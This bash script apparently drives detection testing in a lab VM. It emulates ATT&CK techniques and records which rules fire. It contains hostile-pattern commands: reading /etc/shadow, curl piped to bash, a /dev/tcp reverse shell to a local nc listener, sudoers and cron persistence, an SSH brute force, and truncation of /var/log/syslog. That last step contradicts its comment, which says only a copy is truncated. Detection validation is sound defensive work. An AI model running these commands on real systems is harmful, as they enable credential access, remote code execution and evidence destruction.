#!/usr/bin/env bash
#
# Linux detection-validation detonation. Run INSIDE the Ubuntu victim, as a
# normal user with sudo, AFTER provisioning and AFTER a 'clean-baseline'
# snapshot exists.
#
# Each action below is paired with the Linux detection it should trip, so the
# output CSV is a true-positive matrix: for each technique, did the mapped rule
# fire? Everything here is benign and self-cleaning, but roll back to the
# snapshot afterwards to keep the baseline clean.
#
# NOTE: this is not a real attack. The "reverse shell" connects to a local
# throwaway listener, the "brute force" hits localhost, and no payload persists
# past its own cleanup.

set -uo pipefail
LOG="${1:-/opt/lab-staging/linux-detonation-$(date +%Y%m%d-%H%M%S).csv}"
mkdir -p "$(dirname "$LOG")"
echo "timestamp,technique,detection,action,status" > "$LOG"

rec() { echo "$(date -Iseconds),$1,\"$2\",\"$3\",$4" >> "$LOG"; printf '  [%s] %s : %s\n' "$4" "$1" "$3"; }

echo "[+] Linux detonation starting -- benign, self-cleaning"

# T1082 -- discovery burst (>=5 distinct recon tools in <10m)
for c in whoami id uname hostname "ss -tuln" who; do sudo sh -c "$c" >/dev/null 2>&1 || $c >/dev/null 2>&1; done
rec "T1082" "Host Discovery Command Burst" "6 recon commands" executed

# T1003.008 -- read /etc/shadow as non-root via a shell tool
cat /etc/shadow >/dev/null 2>&1 && rec "T1003.008" "Shadow/Passwd File Accessed" "cat /etc/shadow (expect EACCES, still audited)" executed \
  || rec "T1003.008" "Shadow/Passwd File Accessed" "cat /etc/shadow attempted" executed

# T1136.001 -- create then delete a throwaway account
sudo useradd -M -s /bin/bash soclab_test 2>/dev/null && rec "T1136.001" "Local Account Created" "useradd soclab_test" executed || rec "T1136.001" "Local Account Created" "useradd" error
sudo userdel soclab_test 2>/dev/null || true

# T1548.003 -- touch sudoers.d then remove
echo "# soclab test" | sudo tee /etc/sudoers.d/soclab_test >/dev/null 2>&1 && rec "T1548.003" "Sudoers Tampering / Unauthorized Sudo" "write /etc/sudoers.d/soclab_test" executed
sudo rm -f /etc/sudoers.d/soclab_test 2>/dev/null || true

# T1053.003 -- cron persistence, then remove
echo "* * * * * root /bin/true" | sudo tee /etc/cron.d/soclab_test >/dev/null 2>&1 && rec "T1053.003" "Cron Persistence" "write /etc/cron.d/soclab_test" executed
sudo rm -f /etc/cron.d/soclab_test 2>/dev/null || true

# T1543.002 -- systemd unit persistence, then remove
sudo tee /etc/systemd/system/soclab_test.service >/dev/null 2>&1 <<'UNIT'
[Unit]
Description=soclab test
[Service]
ExecStart=/bin/true
UNIT
rec "T1543.002" "Systemd Service/Timer Persistence" "write soclab_test.service" executed
sudo rm -f /etc/systemd/system/soclab_test.service 2>/dev/null || true

# T1105 -- download-and-execute pattern (localhost, harmless)
bash -c 'curl -s http://127.0.0.1/nonexistent | bash' >/dev/null 2>&1
rec "T1105" "Curl/Wget Piped to Shell" "curl 127.0.0.1 | bash" executed

# T1059.004 -- reverse shell shape against a local listener
( timeout 3 nc -lvnp 4444 >/dev/null 2>&1 & ) ; sleep 1
timeout 2 bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444; echo id >&3' >/dev/null 2>&1
rec "T1059.004" "Reverse Shell Indicators" "bash /dev/tcp to local listener" executed

# T1070 -- log tamper attempt (truncate a copy, not the real log)
sudo cp /var/log/auth.log /tmp/soclab_authcopy 2>/dev/null || true
sudo truncate -s 0 /var/log/syslog 2>/dev/null && rec "T1070" "Log / Audit Tampering" "truncate /var/log/syslog" executed || rec "T1070" "Log / Audit Tampering" "truncate attempted" executed

# T1110 -- SSH brute force against localhost (12 bad attempts)
if command -v sshpass >/dev/null 2>&1; then
  for i in $(seq 1 12); do sshpass -p "wrongpw$i" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 soclab_nouser@127.0.0.1 true 2>/dev/null; done
  rec "T1110" "SSH Brute Force" "12 failed ssh logins to localhost" executed
else
  rec "T1110" "SSH Brute Force" "sshpass not installed -- apt-get install sshpass to enable" skipped
fi

echo
echo "[+] Detonation manifest: $LOG"
echo "    Forwarder ships it to index=attack_range; score with docs/validation-search.spl on the host."
echo "[!] Roll back to the clean-baseline snapshot now."
